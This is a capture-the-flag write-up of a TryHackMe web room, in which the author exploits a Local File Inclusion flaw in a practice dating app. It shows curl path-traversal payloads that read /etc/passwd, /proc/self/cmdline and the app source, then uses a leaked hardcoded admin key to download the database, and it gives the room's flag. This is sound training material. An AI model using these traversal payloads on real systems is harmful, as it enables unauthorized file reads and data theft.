## Introduction

Valenfind is a web security challenge from the Love at First Breach 2026 event on TryHackMe. In this room, I assessed a newly launched dating application, uncovered a Local File Inclusion (LFI) vulnerability, accessed sensitive files, and leveraged exposed secrets to retrieve the flag.

## Initial Reconnaissance

<img width="924" height="717" alt="image" src="https://github.com/user-attachments/assets/15436140-b246-4e5c-b5dc-e367e8b2cd88" />

The room already provided the web application URL, and I noticed that the application was running on port 5000. I started by opening the website to see what functionality was available.

<img width="1891" height="531" alt="image" src="https://github.com/user-attachments/assets/e92b772a-f438-4054-840f-85444f2b5ab9" />

On the landing page, I clicked the **Start Journey** button. The application redirected me to a registration page, requiring a new account before accessing the platform.

<img width="1898" height="495" alt="image" src="https://github.com/user-attachments/assets/f1b5c8c2-8c50-4753-8fd3-814fab7a112a" />

After creating an account and logging in, I was taken to the dashboard. From there, I could see several user profiles that had already been created within the application.

<img width="1891" height="967" alt="image" src="https://github.com/user-attachments/assets/bc7329d3-2679-4e11-84b9-583461a73b34" />

While exploring the application, I found that I could like other users, view their profiles, and modify my own profile settings such as the bio and theme.

<img width="1917" height="745" alt="image" src="https://github.com/user-attachments/assets/72810aa9-4914-4604-9fa4-af9675d920b3" />

At first glance, everything appeared to be working normally. I tried sending a Valentine by clicking the available button, but I did not notice any interesting URL changes. To understand how the application was functioning behind the scenes, I opened the browser's developer tools and monitored the network traffic.

While changing the profile theme, I noticed a GET request being made to the following endpoint:

```
http://10.48.151.100:5000/api/fetch_layout?layout=theme_classic.html
```

<img width="1915" height="967" alt="image" src="https://github.com/user-attachments/assets/2d148320-a341-46a8-93e8-11adbdedefe8" />

The API appeared to be fetching layout templates based on the value supplied in the `layout` parameter. Since user input was being used to determine which file was loaded, I decided to test for a Local File Inclusion vulnerability by supplying path traversal sequences.

My first test targeted `/etc/passwd` using the payload `../../../../etc/passwd`. I sent the request directly from my terminal using curl. Since the application appeared to be heavily vibe-coded, I suspected that authentication checks might not be enforced on this endpoint. That assumption turned out to be correct, as the request worked without requiring any session cookie.

```
curl http://10.48.151.100:5000/api/fetch_layout?layout=../../../../etc/passwd
```

The response returned the contents of `/etc/passwd`, confirming that the endpoint was vulnerable to Local File Inclusion through path traversal.

## Source Code Discovery

After confirming the Local File Inclusion vulnerability, my next objective was to locate the application's source code on the server.

A useful Linux technique for this is reading `/proc/self/cmdline`. The `/proc` filesystem exposes information about running processes, and `/proc/self` refers to the current process handling the request. The `cmdline` file contains the exact command used to start that process.

I used the following request to read it:

```bash
$ curl http://10.48.151.100:5000/api/fetch_layout?layout=../../../../proc/self/cmdline -O 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    39  100    39    0     0    598      0 --:--:-- --:--:-- --:--:--   600
death@esther:~$ cat fetch_layout 
/usr/bin/python3/opt/Valenfind/app.py
```

The same request can also be performed through Burp Suite if preferred.

The response revealed the full path of the application entry point, giving me a precise target to read next.

The application was located at:

```
/opt/Valenfind/app.py
```

I then requested the file directly through the vulnerable endpoint:

```bash
curl http://10.48.151.100:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py
```

<img width="1086" height="562" alt="image" src="https://github.com/user-attachments/assets/ddbb9ed6-1c5b-4c1a-ac9a-41103fba7eb7" />

<img width="1521" height="530" alt="image" src="https://github.com/user-attachments/assets/a1efa4d3-7acd-416a-93bb-599a7dacc48b" />

The server returned the complete Python source code. While reviewing it, I found two particularly interesting hardcoded values near the beginning of the file:

```python
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
DATABASE      = 'cupid.db'
```

Further down in the source code, I found an administrative endpoint responsible for exporting the application's database:

```python
@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    if auth_header == ADMIN_API_KEY:
        try:
            return send_file(DATABASE, as_attachment=True,
                             download_name='valenfind_leak.db')
        except Exception as e:
            return str(e)
    else:
        return jsonify({"error": "Forbidden",
                        "message": "Missing or Invalid Admin Token"}), 403
```

## Database Extraction

The source code revealed an endpoint at `/api/admin/export_db` that allowed the entire database to be downloaded. Access to the endpoint was protected by the `X-Valentine-Token` header, but the required token had already been exposed in the application source code.

Using the recovered API key, I requested the database export:

```bash
curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
     http://MACHINE_IP:5000/api/admin/export_db \
     -o valenfind.db
```

Once the database was downloaded, I opened it with SQLite and inspected the available tables:

```bash
sqlite3 valenfind.db
sqlite> .tables
users
sqlite> SELECT * FROM users;
```

Reviewing the contents of the database revealed the room flag.

## Flag

```text
THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
```

## Conclusion

Valenfind was a short and enjoyable room focused on identifying a Local File Inclusion vulnerability and using it to read sensitive files from the server. By leveraging the file read primitive, I was able to locate the application's source code, recover a hardcoded administrative API key, and ultimately export the database to obtain the flag.
